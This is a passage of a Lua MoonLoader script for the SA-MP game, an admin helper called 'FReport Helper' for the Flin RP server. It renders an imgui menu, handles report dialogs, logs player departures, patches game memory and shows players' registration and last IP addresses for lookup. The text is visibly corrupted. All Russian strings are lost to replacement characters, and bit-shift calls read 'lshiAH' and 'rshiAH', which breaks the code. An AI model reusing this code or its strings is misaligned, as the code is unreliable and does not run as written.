            local a = tonumber(color:sub(7, 8), 16) or colors[1].w * 255
            return ImVec4(r, g, b, a / 255)
        end
        local color = type(color) == 'string' and tonumber(color, 16) or color
        if type(color) ~= 'number' then return end
        local r, g, b, a = explode_argb(color)
        return imgui.ImColor(r, g, b, a):GetVec4()
    end

    local render_text = function(text_)
        for w in text_:gmatch('[^\r\n]+') do
            local textsize = w:gsub('{.-}', '')
            local text_width = imgui.CalcTextSize(u8(textsize))
            imgui.SetCursorPosX( width / 2 - text_width .x / 2 )
            local text, colors_, m = {}, {}, 1
            w = w:gsub('{(......)}', '{%1FF}')
            while w:find('{........}') do
                local n, k = w:find('{........}')
                local color = getcolor(w:sub(n + 1, k - 1))
                if color then
                    text[#text], text[#text + 1] = w:sub(m, n - 1), w:sub(k + 1, #w)
                    colors_[#colors_ + 1] = color
                    m = n
                end
                w = w:sub(1, n - 1) .. w:sub(k + 1, #w)
            end
            if text[0] then
                for i = 0, #text do
                    imgui.TextColored(colors_[i] or colors[1], u8(text[i]))
                    imgui.SameLine(nil, 0)
                end
                imgui.NewLine()
            else
                imgui.Text(u8(w))
            end
        end
    end
    render_text(text)
end

function sampev.onPlayerQuit(playerId, reason)
	if logging then
		if reason == 0 then
			if doesFileExist(fpath) then
				local fa = io.open(fpath, 'a+')
				if fa then fa:write("["..os.date("*t", os.time()).hour..":"..os.date("*t", os.time()).min..":"..os.date("*t", os.time()).sec.."] ����� "..sampGetPlayerNickname(playerId).."("..playerId..") ������� ������. �������: �����\n"):close() end
			end
		elseif reason == 1 then
			if doesFileExist(fpath) then
				local fa = io.open(fpath, 'a+')
				if fa then fa:write("["..os.date("*t", os.time()).hour..":"..os.date("*t", os.time()).min..":"..os.date("*t", os.time()).sec.."] ����� "..sampGetPlayerNickname(playerId).."("..playerId..") ������� ������. �������: ���/���\n"):close() end
			end
		elseif reason == 2 then
			if doesFileExist(fpath) then
				local fa = io.open(fpath, 'a+')
				if fa then fa:write("["..os.date("*t", os.time()).hour..":"..os.date("*t", os.time()).min..":"..os.date("*t", os.time()).sec.."] ����� "..sampGetPlayerNickname(playerId).."("..playerId..") ������� ������. �������: �������\n"):close() end
			end
		end
	end
end

--vihod = '11.09.2021'
--version = '3.2'
--authors = '{ffdead}Nik_Everyone{ffffff}'
--obnova = '23.10.2021'

function clearNick(nick)
    if nick:find('%[PC') or nick:find('%[VIP') then return nick:gsub('(.-)%[.*', '%1')
    else return nick end
end

function sampGetPlayerIdByNickname(nick)
    nick_check = tostring(nick)
    nick_check = clearNick(nick_check)
    local _, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
    if nick_check == clearNick(sampGetPlayerNickname(myid)) then return myid end
    for i = 0, 1000 do
        if sampGetPlayerScore(i) > 0 then
            if sampIsPlayerConnected(i) and clearNick(sampGetPlayerNickname(i)) == nick_check then
                return i
            end
        end
    end
end

function cmd_Reload()
    ReloadBool = true
    sampSendChat("/offadmins")
    local file = io.open(IniDirectory, "w")
    file:write("")
end

function enableDialog(bool)
    memory.setint32(sampGetDialogInfoPtr()+40, bool and 1 or 0, true)
    sampToggleCursor(bool)
end

function DisableBikeFallInWater(bState)
  if bState then
  	memory.fill(0x6B9DEA, 0x90, 5, false)
  else
    memory.setuint32(0x6B9DEA, 0xFFC1C1E8, false)
    memory.setuint8(0x6B9DEA + 0x4, 0xFF, false)
  end
end

function clearNick(nickname)
    if nickname:find('%[PC') or nickname:find('%[VIP') then
        nickname = nickname:gsub('(.-)%[.*', '%1')
        return nickname
    else
        return nickname
    end
end

function cmd_mkil()
	nick_report = "Chad_Deep"
	text_report = "Chad_Deep"
	id_report = "23"
	main_window_state.v = not main_window_state.v
end

function cmd_kaka()
	main_window_state.v = not main_window_state.v
end

function sampGetPlayerIdByNickname(nick)
 	nick = tostring(nick)
  	local _, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
  	nick_check = sampGetPlayerNickname(myid)
	if nick == clearNick(nick_check) then return myid end

	for i = 0, 999 do
		if sampIsPlayerConnected(i) and clearNick(sampGetPlayerNickname(i)) == nick then
      		return i
    	end
    end
end

function sampev.onShowDialog(dialogID, style, title, button1, button2, text)


    if text:find("������/���������:") and text:find("��������:") and text:find("����� ��������:") then
    	id_dialog = dialogID
	    nick_report = text:match("��������: (%S*)")
	    text_report = text:gsub('��������: (.*)', '')
	    id_report = sampGetPlayerIdByNickname(nick_report)
		--id_report = other.recon_id tonumber(arg)
		
		
	   	if text:find("[+%-%d]%d*") then
	        id_suspect = text:match("[+%-%d]%d*")
	    	recon_suspect = true
			
	    else
        	recon_suspect = false
			
	    end
	    enableDialog(false)
	    main_imgui()
    	return false
    end
end

function string.rlower(s)
    s = s:lower()
    local strlen = s:len()
    if strlen == 0 then return s end
    s = s:lower()
    local output = ''
    for i = 1, strlen do
        local ch = s:byte(i)
        if ch >= 192 and ch <= 223 then -- upper russian characters
            output = output .. russian_characters[ch + 32]
        elseif ch == 168 then -- �
            output = output .. russian_characters[184]
        else
            output = output .. string.char(ch)
        end
    end
    return output
end

function imgui.NewInputText(lable, val, width, hint, hintpos)
    local hint = hint and hint or ''
    local hintpos = tonumber(hintpos) and tonumber(hintpos) or 1
    local cPos = imgui.GetCursorPos()
    imgui.PushItemWidth(width)
    local result = imgui.InputText(lable, val)
    if #val.v == 0 then
      local hintSize = imgui.CalcTextSize(hint)
      if hintpos == 2 then imgui.SameLine(cPos.x + (width - hintSize.x) / 2)
      elseif hintpos == 3 then imgui.SameLine(cPos.x + (width - hintSize.x - 5))
      else imgui.SameLine(cPos.x + 5) end
      imgui.TextColored(imgui.ImVec4(1.00, 1.00, 1.00, 0.40), tostring(hint))
    end
    imgui.PopItemWidth()
    return result
end

function join_argb(a, r, g, b)
	local argb = b  -- b
	argb = bit.bor(argb, bit.lshiAH(g, 8))  -- g
	argb = bit.bor(argb, bit.lshiAH(r, 16)) -- r
	argb = bit.bor(argb, bit.lshiAH(a, 24)) -- a
	return argb
end

--[[nikeveryone = 0
nikeveryone = tonumber(arg) 
	nikeveryone = sampGetPlayerIdByNickname(Nik_Everyone)--]]
function sampev.onServerMessage(color, text)


lua_thread.create(function()
	if text:find("%[A%] %[REPORT%]") then
	wait(0)
		printStyledString('REPORT++', 2000, 5)
	if areport == 1 then
	
	
	--sampAddChatMessage("�����")
	sampSendChat("/arep")

	end
	
	end
	end)
	
	--{AA3333}[������]: {ffffff}����� �� ������.
	if text:find("�� ����� �� ������ ��������.") then
	okno.v = false
statew.v = false
statew2.v = false
statew4.v = false
statew5.v = false
statew9.v = false
statew6.v = false
statew7.v = false
pstatew.v = false
pstatew2.v = false
pstatew4.v = false
pstatew5.v = false
pstatew9.v = false
pstatew6.v = false
pstatew7.v = false
	end
	
	if text:find('%[TEST%] %[111%]                                                                      -') then
lua_thread.create(function()
	
	wait(1000)
	sampSendChat("[For Developers] [FReport Helper]: � ������� ������ ���������� FReport Helper.")
	wait(1000)
	sampSendChat("[For Developers] [FReport Helper]: ������������: ".. nick:gsub('%[PC%]', '').. "["..id.."] .")
	wait(1000)
	sampSendChat("[For Developers] [FReport Helper]: ������ FReport Helper: 2.3 .")
	wait(1500)
	sampSendChat("[For Developers] [FReport Helper]: ���������� ���.")
	end)
	end

	if text:find('%[TEST%] %[222%]                                                                      -') then
lua_thread.create(function()
	
wait(1000)
	sampSendChat("/a [For Developers] [FReport Helper]: � ������� ������ ���������� FReport Helper 2.3 .")
	
	end)
	end


	

	if text:find('���. IP:') and text:find('������. IP:') and checking_reg then
		nick, rip, lip = text:match('�������: (.+)| ���. IP: (%d+.%d+.%d+.%d+) | ������. IP: (%d+.%d+.%d+.%d+)')
		sampAddChatMessage(tag..' {ffffff}Nick ['..nick..'] R-IP ['..rip..'] L-IP [' .. lip .. '] IP [' .. lip .. ']', -1)
		ipinfo(rip..','..lip)
		checking_reg = false
		return false
	end
	
	
	
	
	
	end

function imgui.Link(label, description)

    local size = imgui.CalcTextSize(label)
    local p = imgui.GetCursorScreenPos()
    local p2 = imgui.GetCursorPos()
    local result = imgui.InvisibleButton(label, size)

    imgui.SetCursorPos(p2)

    if imgui.IsItemHovered() then
        if description then
            imgui.BeginTooltip()
            imgui.PushTextWrapPos(600)
            imgui.TextUnformatted(description)
            imgui.PopTextWrapPos()
            imgui.EndTooltip()

        end

        imgui.TextColored(imgui.GetStyle().Colors[imgui.Col.CheckMark], label)
        imgui.GetWindowDrawList():AddLine(imgui.ImVec2(p.x, p.y + size.y), imgui.ImVec2(p.x + size.x, p.y + size.y), imgui.GetColorU32(imgui.GetStyle().Colors[imgui.Col.CheckMark]))

    else
        imgui.TextColored(imgui.GetStyle().Colors[imgui.Col.CheckMark], label)
    end

    return result
end

function ev.onServerMessage(color, text)
if text:find('�� ����� �� ������ ��������') then
okno.v = false
backokno.v = false
nextokno.v = false
statew.v = false
statew2.v = false
statew4.v = false
statew5.v = false
statew9.v = false
statew6.v = false
statew7.v = false
pstatew.v = false
pstatew2.v = false
pstatew4.v = false
pstatew5.v = false
pstatew9.v = false
pstatew6.v = false
pstatew7.v = false
end
end

  function explode_argb(argb)
		local a = bit.band(bit.rshiAH(argb, 24), 0xFF)
		local r = bit.band(bit.rshiAH(argb, 16), 0xFF)
		local g = bit.band(bit.rshiAH(argb, 8), 0xFF)
		local b = bit.band(argb, 0xFF)
		return a, r, g, b
  end

function imgui.Hint(text, delay)
    if imgui.IsItemHovered() then
        if go_hint == nil then go_hint = os.clock() + (delay and delay or 0.0) end
        local alpha = (os.clock() - go_hint) * 5 -- �������� ���������
        if os.clock() >= go_hint then 
            imgui.PushStyleVar(imgui.StyleVar.Alpha, (alpha <= 1.0 and alpha or 1.0))
                imgui.PushStyleColor(imgui.Col.PopupBg, imgui.GetStyle().Colors[imgui.Col.ButtonHovered])
                    imgui.BeginTooltip()
                    imgui.PushTextWrapPos(450)
                    imgui.TextUnformatted(text)
                    if not imgui.IsItemVisible() and imgui.GetStyle().Alpha == 1.0 then go_hint = nil end
                    imgui.PopTextWrapPos()
                    imgui.EndTooltip()
                imgui.PopStyleColor()
            imgui.PopStyleVar()
        end
    end
end

local fsClock = nil
function imgui.BeforeDrawFrame()
	if fsClock == nil then
        fsClock = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14) .. '\\trebucbd.ttf', 25.0, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())
    end
end

function areportareportareport()
arepot = not areport

end

function getNick(id)
    local nick = sampGetPlayerNickname(id)
    return nick

end


function imgui.OnDrawFrame()
	easy_style()
	if cfg.settings.theme == 0 then
		theme1()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 1 then
		theme2()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 2 then
		theme3()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 3 then
		theme4()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 4 then
		theme5()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 5 then
		theme6()
		
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 6 then
		theme7()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 7 then
		theme8()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 8 then
		theme9()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 9 then
		theme10()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 10 then
		theme11()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 11 then
		theme12()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 12 then
		blackred()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme == 13 then
		zoloto()
		other.tema.v = cfg.settings.theme
		elseif cfg.settings.theme == 14 then
		theme13()
		other.tema.v = cfg.settings.theme
		elseif cfg.settings.theme == 15 then
		theme14()
		other.tema.v = cfg.settings.theme
	elseif cfg.settings.theme ~= 1 and cfg.settings.theme ~= 2 and cfg.settings.theme ~= 3 and cfg.settings.theme ~= 4 and cfg.settings.theme ~= 5 and cfg.settings.theme ~= 6 and cfg.settings.theme ~= 7 and cfg.settings.theme ~= 8 and cfg.setting.theme ~= 9 and cfg.settings.theme ~= 10
	and cfg.settings.theme ~= 11 then
		 cfg.settings.theme = 1
		 theme2()
		 other.tema.v = cfg.settings.theme
		 inicfg.save(cfg, cfgConfig)
	end
	
	local x, y = ToScreen(552, 230)
local w, h = ToScreen(638, 330)
local m, a = ToScreen(456, 395)


	if recon_helper.v then
		sw, sh = getScreenResolution()
		imgui.ShowCursor = false

		imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
		imgui.SetNextWindowSize(imgui.ImVec2(700, 375), imgui.Cond.FirstUseEver)
		imgui.Begin(u8"##marselies", recon_helper, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoMove)
		imgui.End()
	end
	if admmenu.v then
		sw, sh = getScreenResolution()
		imgui.ShowCursor = true
	
		imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
		imgui.SetNextWindowSize(imgui.ImVec2(780, 525), imgui.Cond.FirstUseEver)
		imgui.Begin(u8"FReport Helper| ������� ���� �������", admmenu, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize)
		imgui.BeginChild("leAH", imgui.ImVec2(250, 480), true)
			if imgui.Button(u8"������� ����", imgui.ImVec2(-0.1, 30)) then selected = 0 end
		if imgui.Button(u8"���������� � ������� �������", imgui.ImVec2(-0.1, 30)) then selected = 2 end
		imgui.Separator()
			if imgui.Button(u8"Premium", imgui.ImVec2(-0.1, 30)) then--[[ selected = 14 --]] selected = 100 end
		imgui.Separator()
		if imgui.Button(u8"��������� ����������������  \n          ������ � �������", imgui.ImVec2(-0.1, 32)) then 
		admmenu.v = false
		izmenarmenu.v = true
		end
		if imgui.Button(u8"��������� �������", imgui.ImVec2(-0.1, 28)) then selected = 12 end
	
		if imgui.Button(u8"�������", imgui.ImVec2(-0.1, 25))  then
		
			admmenu.v = false
			sampSendChat("/arep")
		end
			if imgui.Button(u8"���������� ����", imgui.ImVec2(-0.1, 28)) then selected = 5 end
		imgui.SetCursorPosX((imgui.GetWindowWidth() - 110) / 2);
		imgui.Separator()
		if imgui.Button(u8'������������� ������', imgui.ImVec2(-0.1, 26)) then
			admmenu.v = false
			statew.v = false
			okno.v = false
				backokno.v = false
				nextokno.v = false
			admstats.v = false
			imgui.ShowCursor = false
			cfg.settings.unload = true
			cfg.settings.unloadlvl = lvl
			inicfg.save(cfg, cfgConfig)
			thisScript():reload()
		end
		if imgui.Button(u8'��������� ������', imgui.ImVec2(-0.1, 26)) then
			admmenu.v = false
			statew.v = false
			okno.v = false
				backokno.v = false
				nextokno.v = false
			admstats.v = false
			imgui.ShowCursor = false
			cfg.settings.unload = true
			cfg.settings.unloadlvl = lvl
			inicfg.save(cfg, cfgConfig)
			sampAddChatMessage('{ffdead}[FReport Helper]:{FFFFFF} ������ ��� ��������. ��� ����������� ����������� {ffdead}CTRL{ffffff} + {ffdead}R{ffffff}.', 0xffdead)
			sampAddChatMessage('{ffdead}[FReport Helper]:{FFFFFF} ���� � ��� �� ������ ���������� �����, �� ������� ��� ���� �� {ffdead}TAB{ffffff}.', 0xffdead)
			lua_thread.create(function()
				wait(800)
				thisScript():unload()
			end)
		end
		--	imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022') imgui.PopFont()
		imgui.Separator()
		imgui.Text(u8"\n")
		imgui.CenterTextColoredRGB('{f44f36}Scripts {ffffff}with {FF0000}love {ffffff}from {32CD32}N.Everyone')
		imgui.Text(u8"\n")
		imgui.Separator()
		--imgui.CenterTextColoredRGB('')
		imgui.NewLine()
		imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022') imgui.PopFont()
		imgui.NewLine()
		--imgui.CenterTextColoredRGB('')
		imgui.Separator()
		if imgui.Button(u8"���������� �� �����������", imgui.ImVec2(-0.1, 25)) then selected = 3 end
		if imgui.Button(u8"���������� �  S U P � 2022", imgui.ImVec2(-0.1, 25)) then selected = 4 end
		imgui.SetCursorPosX((imgui.GetWindowWidth() - imgui.CalcTextSize(u8'FReport Helper: ' .. thisScript().version).x) / 2);
		
		imgui.EndChild()
		imgui.SameLine()
		imgui.BeginChild("right", imgui.ImVec2(0, 480), true)
		if selected == 100 then 
		imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{ffdead}FReport Helper {FFD700}P{ffdead}remium{ffffff}') imgui.PopFont()
		imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{ffdead}In Development{ffffff}...') imgui.PopFont()
		imgui.Separator()
		imgui.NewLine()
		imgui.NewLine()
		imgui.NewLine()
		imgui.CenterTextColoredRGB('������� ��������� �����, ������� ���������.')
		imgui.NewLine()
			imgui.SetCursorPosX(195)
		if imgui.Link(u8"������ ���������", u8"��������  S U P , ����������� ��.") then
    os.execute(('explorer.exe "%s"'):format("https://vk.com/nikeveryone"))
end
imgui.NewLine()
imgui.Separator()

imgui.NewLine()
imgui.NewLine()
--imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022') imgui.PopFont()
imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}S') imgui.PopFont()
imgui.NewLine()
imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}U') imgui.PopFont()
imgui.NewLine()
imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}P') imgui.PopFont()
imgui.NewLine()
imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{ffdead}� ') imgui.PopFont()
imgui.NewLine()
imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}2022') imgui.PopFont()
imgui.NewLine()
imgui.NewLine()
imgui.Separator()
		end
		if selected == 14 then 
		imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{ffdead}FReport Helper {FFD700}P{ffdead}remium{ffffff}') imgui.PopFont()
	--[[	imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{ffdead}In Development{ffffff}...') imgui.PopFont()
		imgui.Separator()
		imgui.NewLine()
		imgui.NewLine()
		imgui.NewLine()
		imgui.CenterTextColoredRGB('������� ��������� �����, ������� ���������.')
		imgui.NewLine()
			imgui.SetCursorPosX(195)
		if imgui.Link(u8"������ ���������", u8"��������  S U P , ����������� ��.") then
    os.execute(('explorer.exe "%s"'):format("https://vk.com/nikeveryone"))
end
imgui.NewLine()
imgui.Separator()

imgui.NewLine()
imgui.NewLine()
--imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022') imgui.PopFont()
imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}S') imgui.PopFont()
imgui.NewLine()
imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}U') imgui.PopFont()
imgui.NewLine()
imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}P') imgui.PopFont()
imgui.NewLine()
imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{ffdead}� ') imgui.PopFont()
imgui.NewLine()
imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}2022') imgui.PopFont()
imgui.NewLine()
imgui.NewLine()
imgui.Separator()--]]
imgui.Separator()
	imgui.BeginChild("wewe", imgui.ImVec2(0, 145), true)
	imgui.TextColoredRGB('��� {00FFFF}Nick_Name: {008000}' .. nick:gsub('%[PC%]', '').. '{ffffff}.')
	imgui.SameLine()
		imgui.TextColoredRGB('  ���������� {ffdead}Premium{ffffff}: ')
		imgui.SameLine()
		 imgui.NewInputText(u8'##premium', text_bufferpremium, 120, u8"    ��� �������", 4)
imgui.TextColoredRGB('     ��������� {ffdead}Premium{ffffff}: {32CD32}50� {ffffff}  |   {ffffff}{FFA500}������� �� ������� {ffffff}  - ')
imgui.SameLine()
if imgui.Link(u8"������ ���������", u8"��������  S U P , ����������� ��.") then
    os.execute(('explorer.exe "%s"'):format("https://vk.com/nikeveryone"))
end
imgui.NewLine()
imgui.SetCursorPosX(155)
if imgui.Button(u8'������� � ������� Premium', imgui.ImVec2(0, 30)) then
				
				pokupka.v = true
				admmenu.v = false
			end
			imgui.NewLine()
			imgui.TextColoredRGB('                         ������ ���������� {ffdead}Premium{ffffff}:')
			imgui.SameLine()
			 imgui.NewInputText(u8'##premiumstatus', text_bufferstatuspremium, 120, u8"  ������ �������", 4)
			
	imgui.EndChild()
	imgui.CenterTextColoredRGB('{FFD700}������������ ���������� {ffdead}Premium{ffffff} �� ������ {ffdead}FReport Helper {FFD700}2.4{ffffff}:')
	imgui.TextColoredRGB('{32CD32}1. {ffdead}������������ ��������������� {f44f36}GPS {ffdead}({FF4500}�� ������{ffdead})')
	imgui.TextColoredRGB('{32CD32}2. {ffdead}������������ ���������������{f44f36} ���.���� �/� {ffdead}({FF4500}�� ������{ffdead})')
	imgui.TextColoredRGB('{32CD32}3. {ffdead}������������ ��������������� {f44f36}/mn {ffdead}({FF4500}�� ������{ffdead})')
	imgui.TextColoredRGB('{32CD32}4. {ffdead}�������� {00FFFF}10 {ffdead}���������������� ������� � ������� {ffdead}({FF0000}��� ������� �������������')
	imgui.TextColoredRGB('{FF0000}2{ffdead})')
	imgui.TextColoredRGB('{32CD32}5. {ffdead}�������� {00FFFF}5 {ffdead}���������������� ������ � ������ ������ � ������ {ffdead}({FF0000}��� �������')
	imgui.TextColoredRGB('{FF0000}������������� 2{ffdead})')
		
		imgui.Separator()
		imgui.NewLine()
		imgui.CenterTextColoredRGB('{ffdead}���������� Premium �������� {32CD32}��������{ffdead}, �� ���� �� ���������')
		imgui.CenterTextColoredRGB('{ffdead}� {FFA500}�� SUP {ffdead}- �����������.')
		imgui.CenterTextColoredRGB('{ffdead}�� ������ {FF0000}���������� {ffdead}�� ���������� Premium � ������� ������')
		imgui.CenterTextColoredRGB('{ffdead} � ������� 12 ����� ����� �������.')
		imgui.NewLine()
		imgui.Separator()
		imgui.CenterTextColoredRGB('{ffdead}��������� ���������� Premium - {32CD32}���������{ffdead}, � ��������� �� ���� �������������.')
		imgui.CenterTextColoredRGB('{ffdead}��� ������������� ���������� Premium � ��� ����� ������������')
			imgui.CenterTextColoredRGB('{ffdead}����� �������� ��������������.')
			end
		if selected == 0 then
			imgui.CenterTextColoredRGB('������� ������: {f44f36}2.3 {ffffff}| {4682B4}ORIGINAL EDITION')
			imgui.Separator()
			imgui.CenterTextColoredRGB('����������� �������: {32CD32}Nik_Everyone')
			imgui.Separator()
			imgui.CenterTextColoredRGB('���� ������ �������: {FF4500}15.02.2022 {ffdead}| {ffffff}������� ������: {FF4500}25.08.2022')
			imgui.Separator()
			imgui.NewLine()
			imgui.CenterTextColoredRGB('�������� �������:')
			imgui.CenterTextColoredRGB('{FFDEAD}FReport Helper {ffffff}- ��� ������, ����� ������� �������� ���������� ������')
			imgui.CenterTextColoredRGB('��� ������������� {FFA500}Flin RP{ffffff} � ����� �������� � ���������.')
			imgui.NewLine()
			imgui.Separator()
			--imgui.CenterTextColoredRGB('{32CD32}��������� {D2691E}�������{ffffff}:')
			imgui.SetCursorPosX(45)
			imgui.SetCursorPosY(205)
	--		imgui.TextColoredRGB('{FFA500}S')
			imgui.PushFont(fsClock) imgui.TextColoredRGB('{FFA500}S') imgui.PopFont()
				imgui.SetCursorPosY(225)
			--imgui.CenterTextColoredRGB('{FFA500}U')
				imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}U') imgui.PopFont()
			imgui.SetCursorPosY(177)
			 imgui.CenterTextColoredRGB('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
			imgui.SetCursorPosX(445)
			imgui.SetCursorPosY(205)
		--	imgui.TextColoredRGB('{FFA500}P')
				imgui.PushFont(fsClock) imgui.TextColoredRGB('{FFA500}P') imgui.PopFont()
			imgui.SetCursorPosY(165)
			
			
			imgui.TextColoredRGB('��� {00FFFF}Nick_Name: {008000}' .. nick:gsub('%[PC%]', '').. '.')
			imgui.SameLine()
			imgui.SetCursorPosX(350)
		   imgui.TextColoredRGB('��� {FFFF00}������� {32CD32}ADM{ffffff}:')
		   imgui.SameLine()
		   
		   
		   imgui.NewInputText(u8'##str_ooc', text_bufferlvl, 30, u8"LVL", 4)
		   
		     if text_bufferlvl.v == "1"  then
		  cfg.settings.lvladmin = 1
		
				inicfg.save(cfg, cfgConfig)
		  end
		  if text_bufferlvl.v == "2"  then
		  cfg.settings.lvladmin = 2
		  	inicfg.save(cfg, cfgConfig)
		  end
		  if text_bufferlvl.v == "3"  then
		  cfg.settings.lvladmin = 3
		  	inicfg.save(cfg, cfgConfig)
		  end
		  if text_bufferlvl.v == "4"  then
		  cfg.settings.lvladmin = 4
		  	inicfg.save(cfg, cfgConfig)
		  end
		  if text_bufferlvl.v == "5"  then
		  cfg.settings.lvladmin = 5
		  	inicfg.save(cfg, cfgConfig)
		  end
		  if text_bufferlvl.v == "6"  then
		  cfg.settings.lvladmin = 6
		  	inicfg.save(cfg, cfgConfig)
		  end
		  if text_bufferlvl.v == "7"  then
		  cfg.settings.lvladmin = 7
		  	inicfg.save(cfg, cfgConfig)
		  end
		  if text_bufferlvl.v == "8"  then
		  cfg.settings.lvladmin = 8
		  	inicfg.save(cfg, cfgConfig)
		  end
		  if text_bufferlvl.v == "9"  then
		  cfg.settings.lvladmin = 9
		  	inicfg.save(cfg, cfgConfig)
		  end
		  if text_bufferlvl.v == "10"  then
		  cfg.settings.lvladmin = 10
		  	inicfg.save(cfg, cfgConfig)
		  end
		   
		    if cfg.settings.lvladmin == 1 then
		   text_bufferlvl.v = '1'
		   end
		   if cfg.settings.lvladmin == 2 then
		   text_bufferlvl.v = '2'
		   end
		   if cfg.settings.lvladmin == 3 then
		   text_bufferlvl.v = '3'
		   end
		    if cfg.settings.lvladmin == 4 then
		   text_bufferlvl.v = '4'
		   end
		    if cfg.settings.lvladmin == 5 then
		   text_bufferlvl.v = '5'
		   end
		    if cfg.settings.lvladmin == 6 then
		   text_bufferlvl.v = '6'
		   end
		    if cfg.settings.lvladmin == 7 then
		   text_bufferlvl.v = '7'
		   end
		    if cfg.settings.lvladmin == 8 then
		   text_bufferlvl.v = '8'
		   end
		    if cfg.settings.lvladmin == 9 then
		   text_bufferlvl.v = '9'
		   end
		    if cfg.settings.lvladmin == 10 then
		   text_bufferlvl.v = '10'
		   end
		   text_bufferpremiumstat.v = '   In Development'
		   if  ishelperScript(sampGetPlayerNickname(id)) then
  text_bufferstatus.v = u8'      ��������'
   
   
   end
    if  ismlmoderatorScript(sampGetPlayerNickname(id)) then
  text_bufferstatus.v = u8'    ��.���������'
   
   
   end
    if  ismoderatorScript(sampGetPlayerNickname(id)) then
  text_bufferstatus.v = u8'      ���������'
   
   
   end
    if  isstmoderatorScript(sampGetPlayerNickname(id)) then
  text_bufferstatus.v = u8'    ��.���������'
   
   
   end
    if  ismladminScript(sampGetPlayerNickname(id)) then
  text_bufferstatus.v = u8'��.�������������'
   
   
   end
    if  isadminScript(sampGetPlayerNickname(id)) then
  text_bufferstatus.v = u8'   �������������'
   
   
   end
    if  israzrabScript(sampGetPlayerNickname(id)) then
  text_bufferstatus.v = u8'     �����������'
   
   
   end
    if  isvladelScript(sampGetPlayerNickname(id)) then
  text_bufferstatus.v = u8'       ��������'
   
   
   end
   if not ishelperScript(sampGetPlayerNickname(id)) and not ismlmoderatorScript(sampGetPlayerNickname(id)) and not ismoderatorScript(sampGetPlayerNickname(id)) and not isstmoderatorScript(sampGetPlayerNickname(id)) and not ismladminScript(sampGetPlayerNickname(id)) and not isadminScript(sampGetPlayerNickname(id)) and not israzrabScript(sampGetPlayerNickname(id)) and not isvladelScript(sampGetPlayerNickname(id))  then
		  text_bufferstatus.v = u8'    ������������'

end		 imgui.SetCursorPosX(110)
		    imgui.TextColoredRGB('��� {f44f36}������ {ffffff}:')
			
			imgui.SameLine()
			
			imgui.TextColoredRGB('                                       {ffdead}Premium {ffffff}:')
			imgui.SetCursorPosX(85)
			  imgui.NewInputText(u8'##status', text_bufferstatus, 120, u8"      ��� ������", 4)
			  imgui.SameLine()
			  imgui.Text(u8'                     ')
			    imgui.SameLine()
			   imgui.NewInputText(u8'##premiumstat', text_bufferpremiumstat, 120, u8"        Premium", 4)
			  imgui.NewLine()
			   imgui.NewLine()
		--  imgui.NewInputText(u8'##Answer_report', text_buffer, 470, u8"������� ��������� ��� ������ �� ������ ������", 2)
--imgui.SetCursorPosY(193)
		   imgui.Separator()
		   imgui.NewLine()
			imgui.CenterTextColoredRGB('��� {FF7F50}���������� � ������� ������� {ffffff}������� ������ � �������:')
			imgui.CenterTextColoredRGB('                 {00FFFF}���������� � ������� �������{ffffff}.             ')
			imgui.CenterTextColoredRGB('�� ���� {FFFF00}�������� {ffffff}� {FF0000}��������� {ffffff}����������� �...')
			imgui.CenterTextColoredRGB('...{0000FF}VK {228B22}������������ {32CD32}N.Everyone{ffffff}.')
			imgui.NewLine()
			imgui.Separator()
			imgui.CenterTextColoredRGB('{0000FF}��������� {228B22}������������ {ffdead}�������{ffffff}:')
			imgui.Separator()
			imgui.NewLine()
			imgui.SetCursorPosX(173)
			--[[if imgui.Button('Nik Everyone | Flin-RP 02') then
				os.execute("explorer \"http://vk.com/nikeveryone\"")
			end--]]
		--	imgui.SetCursorPosX(195)
			if imgui.Link(u8"Nik Everyone | Flin-RP 02", u8"��������  S U P , ����������� ��.") then
